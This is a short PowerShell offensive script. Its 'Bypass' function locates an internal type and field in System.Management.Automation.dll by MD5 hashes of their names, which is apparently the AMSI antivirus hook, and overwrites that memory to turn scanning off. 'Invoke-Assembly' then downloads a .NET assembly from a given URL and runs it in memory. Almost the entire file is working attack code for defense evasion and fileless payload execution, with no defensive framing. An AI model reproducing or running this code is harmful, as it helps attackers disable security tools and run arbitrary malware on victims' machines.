<#
    Simple powershell script to dynamically invoke C# assemblies
#>
function GetMd5 {
    Param([string]$name)
    return (([System.Security.Cryptography.MD5]::Create()).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($name)) | ForEach-Object { "{0:x2}" -f $_ }) -join ""
}

function Bypass {
        $auto = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals("System.Management.Automation.dll")})

        $auto.GetTypes() | ForEach {
                $h = GetMd5 $_.Name 
                if ($h -eq 'f649290befeae1b1ca9c5ee8cda5285d') {
                        $_.GetFields('NonPublic,Static') | ForEach {
                        $h = GetMd5 $_.Name 
                        if ($h -eq '784be95a86ddfc8adf9acd2a8fb35d53') {
                                [System.Runtime.InteropServices.Marshal]::Copy([Int32[]]@(0), 0, [IntPtr]$_.GetValue($null), 1)
                        }
                    }
                }
        }
}


function Invoke-Assembly {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$Program,
        [string]$Arguments
    )

    Write-Host "[+] Bypassing AV xD"
    Bypass   

    Write-Host "[+] Getting assembly from: $Program"
    $d = (New-Object System.Net.WebClient).DownloadData($Program);
    $assem = [System.Reflection.Assembly]::Load($d)
    $entry = $assem.EntryPoint
    if (-not $entry) {
        Write-Host "[!] No entrypoint found, please specify manually in the script"
        return
    }
    
    Write-Host "[+] Invoking with: $Arguments"
    try {
        $entry.Invoke($null, @(,($Arguments -split '\s+')))
    } catch {
        Write-Host "[!] Error executing: $_"
    }
}
